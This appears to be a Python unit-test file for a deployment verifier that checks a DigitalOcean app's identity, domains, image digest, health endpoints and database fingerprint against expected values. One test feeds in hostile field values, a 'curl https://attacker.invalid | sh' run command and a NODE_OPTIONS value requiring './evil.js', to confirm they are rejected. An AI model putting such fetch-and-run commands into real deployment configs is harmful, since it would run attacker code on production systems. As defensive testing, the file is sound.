import json
import hashlib
import unittest
from unittest.mock import patch

from scripts.verify_deploy import (
    NoRedirectHandler,
    active_component_shas,
    get_app,
    main,
    shas_match,
    validate_migration_health_payload,
    validate_production_component_policy,
    validate_runtime_health_payload,
    verify_app_identity,
    verify_migration_health,
    verify_production_origin,
    verify_runtime_health,
)


SHA = "3ce38a8746813de6a03fafbd6269dddaa4fa8fe3"
def logical_database_fingerprint(
    database_name: str, schema_name: str, instance_sentinel: str
) -> str:
    return hashlib.sha256(
        f"restoreassist-logical-db-v2\0{database_name}\0{schema_name}\0{instance_sentinel}".encode()
    ).hexdigest()


DIRECT_DATABASE = {
    "database_name": "postgres",
    "schema_name": "public",
    "instance_sentinel": "11111111-1111-4111-8111-111111111111",
    "server_address": "db.udooysjajglluvuxkijp.supabase.co",
    "server_port": 5432,
}
POOLED_DATABASE = {
    "database_name": "postgres",
    "schema_name": "public",
    "instance_sentinel": "11111111-1111-4111-8111-111111111111",
    "server_address": "aws-0-ap-southeast-2.pooler.supabase.com",
    "server_port": 6543,
}
FINGERPRINT = logical_database_fingerprint(
    DIRECT_DATABASE["database_name"],
    DIRECT_DATABASE["schema_name"],
    DIRECT_DATABASE["instance_sentinel"],
)
COMPONENTS = {
    "services": {
        "web": {
            "github": {
                "repo": "CleanExpo/RestoreAssist",
                "branch": "main",
            },
            "build_command": "npm run build",
            "run_command": "npm start",
        }
    }
}


class VerifyDeployTests(unittest.TestCase):
    def test_unknown_cli_argument_exits_two_without_network_action(self):
        with patch("scripts.verify_deploy.get_app") as get_app_mock:
            self.assertEqual(main(["--help"]), 2)
            get_app_mock.assert_not_called()

    def test_digitalocean_api_redirects_are_not_followed(self):
        self.assertIsNone(
            NoRedirectHandler().redirect_request(
                object(), None, 302, "Found", {}, "https://decoy.example"
            )
        )

        class Response:
            def geturl(self):
                return "https://decoy.example/apps/app-id"

            def read(self):
                return b'{"app":{}}'

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

        with patch("scripts.verify_deploy.open_digitalocean", return_value=Response()):
            with self.assertRaisesRegex(RuntimeError, "redirected"):
                get_app("secret-token", "app-id")

    def test_production_contract_requires_digest_source_and_real_health(self):
        image = {
            "registry_type": "GHCR",
            "registry": "ghcr.io",
            "repository": "cleanexpo/restoreassist",
            "digest": f"sha256:{'a' * 64}",
            "deploy_on_push": {"enabled": False},
        }
        safe = {
            "services": {
                "web": {
                    "image": image,
                    "health_check": {"http_path": "/api/health"},
                }
            }
        }
        self.assertIs(validate_production_component_policy(safe), safe)
        for unsafe, message in (
            (
                {
                    "workers": {
                        "decoy": {
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                                "deploy_on_push": False,
                            }
                        }
                    }
                },
                "must contain services/web",
            ),
            (
                {
                    "services": {
                        "web": {
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                                "deploy_on_push": True,
                            },
                            "health_check": {"http_path": "/api/health"},
                        }
                    }
                },
                "mutable github source",
            ),
            (
                {
                    "services": {
                        "web": {
                            "image": image,
                            "health_check": {"http_path": "/"},
                        }
                    }
                },
                "health_check.http_path",
            ),
            (
                {
                    "services": {
                        "web": {
                            "image": {**image, "digest": "sha256:short"},
                            "health_check": {"http_path": "/api/health"},
                        }
                    }
                },
                "no full sha256 digest",
            ),
            (
                {
                    "services": {
                        "web": {
                            "image": {**image, "tag": "latest"},
                            "health_check": {"http_path": "/api/health"},
                        }
                    }
                },
                "omit tags",
            ),
            (
                {
                    "services": {
                        "web": {
                            "image": {**image, "digest": f"sha256:{'A' * 64}"},
                            "health_check": {"http_path": "/api/health"},
                        }
                    }
                },
                "no full sha256 digest",
            ),
        ):
            with self.subTest(message=message):
                with self.assertRaisesRegex(RuntimeError, message):
                    validate_production_component_policy(unsafe)

    def test_production_contract_rejects_caller_controlled_behaviour_fields(self):
        image = {
            "registry_type": "GHCR",
            "registry": "ghcr.io",
            "repository": "cleanexpo/restoreassist",
            "digest": f"sha256:{'a' * 64}",
            "deploy_on_push": {"enabled": False},
        }
        malicious_fields = {
            "run_command": "curl https://attacker.invalid | sh",
            "envs": [{"key": "NODE_OPTIONS", "value": "--require ./evil.js"}],
            "routes": [{"path": "/", "preserve_path_prefix": True}],
            "instance_count": 0,
            "source_dir": "/alternate",
        }
        for field, value in malicious_fields.items():
            with self.subTest(field=field):
                contract = {
                    "services": {
                        "web": {
                            "image": image,
                            "health_check": {"http_path": "/api/health"},
                            field: value,
                        }
                    }
                }
                with self.assertRaisesRegex(RuntimeError, "unapproved fields"):
                    validate_production_component_policy(contract)

    def test_production_contract_rejects_image_and_health_policy_extras(self):
        image = {
            "registry_type": "GHCR",
            "registry": "ghcr.io",
            "repository": "cleanexpo/restoreassist",
            "digest": f"sha256:{'a' * 64}",
            "deploy_on_push": {"enabled": False},
        }
        for field, value, message in (
            ("tag", "latest", "omit tags"),
            ("source_dir", "/alternate", "image source must contain exactly"),
        ):
            with self.subTest(field=field):
                contract = {
                    "services": {
                        "web": {
                            "image": {**image, field: value},
                            "health_check": {"http_path": "/api/health"},
                        }
                    }
                }
                with self.assertRaisesRegex(RuntimeError, message):
                    validate_production_component_policy(contract)
        contract = {
            "services": {
                "web": {
                    "image": image,
                    "health_check": {"http_path": "/api/health", "port": 9999},
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "health_check.*must exactly equal"):
            validate_production_component_policy(contract)

    def test_spec_only_caller_blocks_even_a_digest_until_signed_build_provenance_exists(self):
        expected = {
            "services": {
                "web": {
                    "image": {
                        "registry_type": "GHCR",
                        "registry": "ghcr.io",
                        "repository": "cleanexpo/restoreassist",
                        "digest": f"sha256:{'a' * 64}",
                        "deploy_on_push": {"enabled": False},
                    },
                    "health_check": {"http_path": "/api/health"},
                }
            }
        }
        live = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "region": "syd",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "web",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                                "deploy_on_push": True,
                            },
                            "health_check": {"http_path": "/"},
                        }
                    ],
                }
            }
        }
        environment = {
            "DIGITALOCEAN_ACCESS_TOKEN": "token",
            "DIGITALOCEAN_APP_ID": "app-id",
            "EXPECTED_APP_NAME": "restore-assist",
            "EXPECTED_REPOSITORY": "CleanExpo/RestoreAssist",
            "EXPECTED_BRANCH": "main",
            "EXPECTED_PRODUCTION_HOST": "restoreassist.app",
            "EXPECTED_REGION": "syd",
            "EXPECTED_COMPONENTS_JSON": json.dumps(expected),
        }
        with patch.dict("os.environ", environment, clear=True), patch(
            "scripts.verify_deploy.get_app", return_value=live
        ) as get_app_mock:
            self.assertEqual(main(["--spec-only"]), 1)
            get_app_mock.assert_not_called()
        del live["app"]["spec"]["services"][0]["github"]
        live["app"]["spec"]["services"][0]["image"] = expected["services"]["web"]["image"]
        live["app"]["spec"]["services"][0]["health_check"]["http_path"] = "/api/health"
        with patch.dict("os.environ", environment, clear=True), patch(
            "scripts.verify_deploy.get_app", return_value=live
        ) as get_app_mock:
            self.assertEqual(main(["--spec-only"]), 1)
            get_app_mock.assert_not_called()

    def test_extracts_active_service_sha(self):
        phase, components = active_component_shas(
            {
                "app": {
                    "spec": {
                        "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                        "services": [
                            {
                                "name": "web",
                                "build_command": "npm run build",
                                "run_command": "npm start",
                                "github": {
                                    "repo": "CleanExpo/RestoreAssist",
                                    "branch": "main",
                                },
                            }
                        ]
                    },
                    "active_deployment": {
                        "phase": "ACTIVE",
                        "services": [{"name": "web", "source_commit_hash": SHA}],
                    }
                }
            }
        )
        self.assertEqual(phase, "ACTIVE")
        self.assertEqual(components, [("services", "web", SHA)])

    def test_fails_closed_without_active_deployment(self):
        with self.assertRaisesRegex(RuntimeError, "no active deployment"):
            active_component_shas({"app": {"spec": {}}})

    def test_binds_verification_to_the_exact_created_deployment_id(self):
        payload = {
            "app": {
                "spec": {"services": [{"name": "web", "github": {}}]},
                "active_deployment": {
                    "id": "older-deployment",
                    "phase": "ACTIVE",
                    "services": [{"name": "web", "source_commit_hash": SHA}],
                },
            }
        }
        with self.assertRaisesRegex(RuntimeError, "deployment id mismatch"):
            active_component_shas(
                payload,
                expected_deployment_id="created-deployment",
            )

    def test_fails_closed_without_source_sha(self):
        with self.assertRaisesRegex(RuntimeError, "no source_commit_hash"):
            active_component_shas(
                {
                    "app": {
                        "spec": {"services": [{"name": "web", "github": {}}]},
                        "active_deployment": {
                            "phase": "ACTIVE",
                            "services": [{"name": "web"}],
                        },
                    }
                }
            )

    def test_fails_closed_when_any_component_omits_source_sha(self):
        with self.assertRaisesRegex(RuntimeError, "workers/background"):
            active_component_shas(
                {
                    "app": {
                        "spec": {
                            "services": [{"name": "web", "github": {}}],
                            "workers": [{"name": "background", "github": {}}],
                        },
                        "active_deployment": {
                            "phase": "ACTIVE",
                            "services": [
                                {"name": "web", "source_commit_hash": SHA}
                            ],
                            "workers": [{"name": "background"}],
                        }
                    }
                }
            )

    def test_rejects_active_component_missing_from_deployment(self):
        with self.assertRaisesRegex(RuntimeError, "component set mismatch"):
            active_component_shas(
                {
                    "app": {
                        "spec": {
                            "services": [
                                {"name": "web", "github": {}},
                                {"name": "api", "github": {}},
                            ]
                        },
                        "active_deployment": {
                            "phase": "ACTIVE",
                            "services": [{"name": "web", "source_commit_hash": SHA}],
                        },
                    }
                }
            )

    def test_rejects_non_object_deployment_component(self):
        with self.assertRaisesRegex(RuntimeError, "non-object component"):
            active_component_shas(
                {
                    "app": {
                        "spec": {"services": [{"name": "web", "github": {}}]},
                        "active_deployment": {"phase": "ACTIVE", "services": [None]},
                    }
                }
            )

    def test_binds_app_name_repository_and_branch(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        verify_app_identity(
            payload,
            "restore-assist",
            "CleanExpo/RestoreAssist",
            "main",
            "restoreassist.app",
            COMPONENTS,
        )

    def test_rejects_wrong_app_identity(self):
        payload = {
            "app": {
                "spec": {
                    "name": "lookalike",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "app name mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_region_and_unapproved_top_level_spec_drift(self):
        base_spec = {
            "name": "restore-assist",
            "region": "fra",
            "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
            "services": [
                {
                    "name": "web",
                    "build_command": "npm run build",
                    "run_command": "npm start",
                    "github": {
                        "repo": "CleanExpo/RestoreAssist",
                        "branch": "main",
                    },
                }
            ],
        }
        with self.assertRaisesRegex(RuntimeError, "region mismatch"):
            verify_app_identity(
                {"app": {"spec": base_spec}},
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
                "syd",
            )
        base_spec["region"] = "syd"
        base_spec["maintenance"] = {"enabled": True}
        with self.assertRaisesRegex(RuntimeError, "unapproved top-level fields"):
            verify_app_identity(
                {"app": {"spec": base_spec}},
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
                "syd",
            )

    def test_rejects_wrong_repository_or_branch(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {"repo": "CleanExpo/Decoy", "branch": "dev"},
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "GitHub source mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_wrong_app_domain(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "decoy.example"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "app domain mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_attacker_primary_domain_beside_canonical_domain(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [
                        {"domain": "attacker.example", "type": "PRIMARY"},
                        {"domain": "restoreassist.app", "type": "CUSTOM"},
                    ],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "domain mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_canonical_domain_when_not_primary(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "CUSTOM"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "domain mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_unexpected_domain_properties_including_wildcard_and_tls_drift(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{
                        "domain": "restoreassist.app",
                        "type": "PRIMARY",
                        "wildcard": True,
                        "minimum_tls_version": "1.0",
                    }],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "domain mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_same_repo_decoy_component(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "decoy",
                            "build_command": "true",
                            "run_command": "serve-old",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        }
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "canonical component set mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_extra_non_github_component(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [
                        {
                            "name": "web",
                            "build_command": "npm run build",
                            "run_command": "npm start",
                            "github": {
                                "repo": "CleanExpo/RestoreAssist",
                                "branch": "main",
                            },
                        },
                        {"name": "decoy-image-service", "image": {"registry_type": "DOCR"}},
                    ],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "canonical component set mismatch"):
            verify_app_identity(
                payload,
                "restore-assist",
                "CleanExpo/RestoreAssist",
                "main",
                "restoreassist.app",
                COMPONENTS,
            )

    def test_rejects_stale_active_deployment_spec_at_expected_sha(self):
        payload = {
            "app": {
                "spec": {
                    "services": [
                        {
                            "name": "web",
                            "github": {"repo": "CleanExpo/RestoreAssist", "branch": "main"},
                        }
                    ]
                },
                "active_deployment": {
                    "phase": "ACTIVE",
                    "services": [{"name": "web", "source_commit_hash": SHA}],
                    "spec": {
                        "services": [
                            {
                                "name": "web",
                                "build_command": "true",
                                "run_command": "serve-stale",
                                "github": {
                                    "repo": "CleanExpo/RestoreAssist",
                                    "branch": "main",
                                },
                            }
                        ]
                    },
                },
            }
        }
        with self.assertRaisesRegex(RuntimeError, r"active deployment spec services/web\.build_command mismatch"):
            active_component_shas(
                payload,
                COMPONENTS,
                "CleanExpo/RestoreAssist",
                "main",
            )

    def test_rejects_active_deployment_region_drift_at_expected_sha(self):
        component = {
            "name": "web",
            "build_command": "npm run build",
            "run_command": "npm start",
            "github": {"repo": "CleanExpo/RestoreAssist", "branch": "main"},
        }
        payload = {
            "app": {
                "spec": {"services": [component]},
                "active_deployment": {
                    "id": "deployment-id",
                    "phase": "ACTIVE",
                    "services": [{"name": "web", "source_commit_hash": SHA}],
                    "spec": {
                        "name": "restore-assist",
                        "region": "fra",
                        "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                        "services": [component],
                    },
                },
            }
        }
        with self.assertRaisesRegex(RuntimeError, "region mismatch"):
            active_component_shas(
                payload,
                COMPONENTS,
                "CleanExpo/RestoreAssist",
                "main",
                "restore-assist",
                "restoreassist.app",
                "syd",
                "deployment-id",
            )

    def test_rejects_stale_nested_health_and_env_contract(self):
        contract = {
            "services": {
                "web": {
                    "github": {
                        "repo": "CleanExpo/RestoreAssist",
                        "branch": "main",
                    },
                    "health_check": {"http_path": "/api/health"},
                    "envs": [
                        {"key": "NODE_ENV", "value": "production"},
                        {"key": "DATABASE_URL", "scope": "RUN_TIME", "type": "SECRET"},
                    ],
                }
            }
        }
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [{
                        "name": "web",
                        "github": {"repo": "CleanExpo/RestoreAssist", "branch": "main"},
                        "health_check": {"http_path": "/stale"},
                        "envs": [
                            {"key": "NODE_ENV", "value": "production"},
                            {"key": "DATABASE_URL", "scope": "RUN_TIME", "type": "SECRET"},
                        ],
                    }],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "health_check.http_path mismatch"):
            verify_app_identity(
                payload, "restore-assist", "CleanExpo/RestoreAssist", "main",
                "restoreassist.app", contract,
            )
        payload["app"]["spec"]["services"][0]["health_check"]["http_path"] = "/api/health"
        payload["app"]["spec"]["services"][0]["envs"].pop()
        with self.assertRaisesRegex(RuntimeError, "envs key set mismatch"):
            verify_app_identity(
                payload, "restore-assist", "CleanExpo/RestoreAssist", "main",
                "restoreassist.app", contract,
            )
        payload["app"]["spec"]["services"][0]["envs"].append(
            {"key": "DATABASE_URL", "scope": "RUN_TIME", "type": "SECRET"}
        )
        payload["app"]["spec"]["services"][0]["health_check"]["port"] = 9999
        with self.assertRaisesRegex(RuntimeError, "health_check.*unexpected fields"):
            verify_app_identity(
                payload, "restore-assist", "CleanExpo/RestoreAssist", "main",
                "restoreassist.app", contract,
            )

    def test_rejects_unexpected_behaviour_changing_component_fields(self):
        payload = {
            "app": {
                "spec": {
                    "name": "restore-assist",
                    "domains": [{"domain": "restoreassist.app", "type": "PRIMARY"}],
                    "services": [{
                        "name": "web",
                        "github": {"repo": "CleanExpo/RestoreAssist", "branch": "main"},
                        "build_command": "npm run build",
                        "run_command": "npm start",
                        "source_dir": "/stale-app",
                    }],
                }
            }
        }
        with self.assertRaisesRegex(RuntimeError, "unexpected fields"):
            verify_app_identity(
                payload, "restore-assist", "CleanExpo/RestoreAssist", "main",
                "restoreassist.app", COMPONENTS,
            )
    def test_rejects_a_pending_failed_deployment(self):
        with self.assertRaisesRegex(RuntimeError, "pending deployment in phase ERROR"):
            active_component_shas(
                {
                    "app": {
                        "spec": {},
                        "pending_deployment": {"phase": "ERROR"},
                        "active_deployment": {"phase": "ACTIVE"},
                    }
                }
            )

    def test_binds_health_origin_to_expected_https_host(self):
        self.assertEqual(
            verify_production_origin("https://restoreassist.app", "restoreassist.app"),
            "https://restoreassist.app",
        )
        for decoy in (
            "https://healthy-decoy.example",
            "http://restoreassist.app",
            "https://restoreassist.app.evil.example",
            "https://restoreassist.app:444",
            "https://restoreassist.app/decoy",
        ):
            with self.subTest(decoy=decoy):
                with self.assertRaisesRegex(RuntimeError, "must be exactly"):
                    verify_production_origin(decoy, "restoreassist.app")

    def test_accepts_only_consistent_healthy_migration_counts(self):
        payload = {
            "status": "ok",
            "counts": {"total": 235, "applied": 235, "failed": 0, "rolled_back": 0},
            "databaseFingerprint": FINGERPRINT,
        }
        self.assertIs(
            validate_migration_health_payload(payload, FINGERPRINT), payload
        )

    def test_runtime_health_requires_database_env_and_exact_deployment_sha(self):
        payload = {
            "status": "ok",
            "deploymentSha": SHA,
            "checks": {
                "database": {"status": "ok", "latencyMs": 8},
                "env": {"status": "ok"},
            },
        }
        self.assertIs(validate_runtime_health_payload(payload, SHA), payload)
        for mutated, message in (
            ({**payload, "status": "degraded"}, "status is not ok"),
            ({**payload, "checks": {**payload["checks"], "database": {"status": "error"}}}, "database check"),
            ({**payload, "checks": {**payload["checks"], "env": {"status": "degraded"}}}, "env check"),
            ({**payload, "deploymentSha": "f" * 40}, "deployment SHA mismatch"),
        ):
            with self.subTest(message=message):
                with self.assertRaisesRegex(RuntimeError, message):
                    validate_runtime_health_payload(mutated, SHA)

    def test_runtime_health_rejects_redirects_and_cacheable_decoys(self):
        payload = {
            "status": "ok",
            "deploymentSha": SHA,
            "checks": {"database": {"status": "ok"}, "env": {"status": "ok"}},
        }

        class Response:
            status = 200

            def __init__(self, final_url, cache_control):
                self.final_url = final_url
                self.headers = {
                    "Content-Type": "application/json",
                    "Cache-Control": cache_control,
                }

            def geturl(self):
                return self.final_url

            def read(self):
                return json.dumps(payload).encode()

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

        health_url = "https://restoreassist.app/api/health"
        with patch("urllib.request.urlopen", return_value=Response("https://decoy.example/api/health", "no-store")):
            with self.assertRaisesRegex(RuntimeError, "redirected"):
                verify_runtime_health("https://restoreassist.app", SHA)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "public, max-age=60")):
            with self.assertRaisesRegex(RuntimeError, "no-store"):
                verify_runtime_health("https://restoreassist.app", SHA)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "no-store")):
            self.assertEqual(verify_runtime_health("https://restoreassist.app", SHA), payload)

    def test_accepts_a_pooled_runtime_fingerprint_for_the_direct_migration_target(self):
        direct_fingerprint = logical_database_fingerprint(
            DIRECT_DATABASE["database_name"],
            DIRECT_DATABASE["schema_name"],
            DIRECT_DATABASE["instance_sentinel"],
        )
        pooled_fingerprint = logical_database_fingerprint(
            POOLED_DATABASE["database_name"],
            POOLED_DATABASE["schema_name"],
            POOLED_DATABASE["instance_sentinel"],
        )
        payload = {
            "status": "ok",
            "counts": {"total": 235, "applied": 235, "failed": 0, "rolled_back": 0},
            "databaseFingerprint": pooled_fingerprint,
        }

        self.assertEqual(direct_fingerprint, pooled_fingerprint)
        self.assertIs(
            validate_migration_health_payload(payload, direct_fingerprint), payload
        )

    def test_rejects_redirected_or_cacheable_migration_health(self):
        payload = {
            "status": "ok",
            "counts": {"total": 235, "applied": 235, "failed": 0, "rolled_back": 0},
            "databaseFingerprint": FINGERPRINT,
        }

        class Response:
            status = 200

            def __init__(self, final_url, cache_control):
                self.final_url = final_url
                self.headers = {
                    "Content-Type": "application/json",
                    "Cache-Control": cache_control,
                }

            def geturl(self):
                return self.final_url

            def read(self):
                return json.dumps(payload).encode()

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

        health_url = "https://restoreassist.app/api/health/migrations"
        with patch("urllib.request.urlopen", return_value=Response("https://decoy.example/health", "no-store")):
            with self.assertRaisesRegex(RuntimeError, "redirected"):
                verify_migration_health("https://restoreassist.app", FINGERPRINT)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "public, max-age=60")):
            with self.assertRaisesRegex(RuntimeError, "no-store"):
                verify_migration_health("https://restoreassist.app", FINGERPRINT)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "public, x-no-store=1, max-age=60")):
            with self.assertRaisesRegex(RuntimeError, "no-store"):
                verify_migration_health("https://restoreassist.app", FINGERPRINT)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "public, no-store=0, max-age=60")):
            with self.assertRaisesRegex(RuntimeError, "no-store"):
                verify_migration_health("https://restoreassist.app", FINGERPRINT)
        with patch("urllib.request.urlopen", return_value=Response(health_url, "no-store")):
            self.assertEqual(
                verify_migration_health("https://restoreassist.app", FINGERPRINT), payload
            )

    def test_rejects_contradictory_migration_counts(self):
        payload = {
            "status": "ok",
            "counts": {"total": 10, "applied": 1, "failed": 9, "rolled_back": 0},
            "databaseFingerprint": FINGERPRINT,
        }
        with self.assertRaisesRegex(RuntimeError, "applied count"):
            validate_migration_health_payload(payload)

    def test_rejects_wrong_database_schema_or_instance_sentinel_fingerprint(self):
        for wrong_fingerprint in (
            logical_database_fingerprint(
                "decoy", "public", DIRECT_DATABASE["instance_sentinel"]
            ),
            logical_database_fingerprint(
                "postgres", "decoy", DIRECT_DATABASE["instance_sentinel"]
            ),
            logical_database_fingerprint(
                "postgres", "public", "22222222-2222-4222-8222-222222222222"
            ),
        ):
            with self.subTest(wrong_fingerprint=wrong_fingerprint):
                payload = {
                    "status": "ok",
                    "counts": {"total": 235, "applied": 235, "failed": 0, "rolled_back": 0},
                    "databaseFingerprint": wrong_fingerprint,
                }
                with self.assertRaisesRegex(RuntimeError, "does not match migration target"):
                    validate_migration_health_payload(payload, FINGERPRINT)

    def test_accepts_only_exact_full_sha(self):
        self.assertTrue(shas_match(SHA, SHA))
        self.assertFalse(shas_match(SHA, SHA[:12]))

    def test_rejects_short_or_different_sha(self):
        self.assertFalse(shas_match(SHA, "3ce38a87"))
        self.assertFalse(shas_match(SHA, "f" * 40))


if __name__ == "__main__":
    unittest.main()
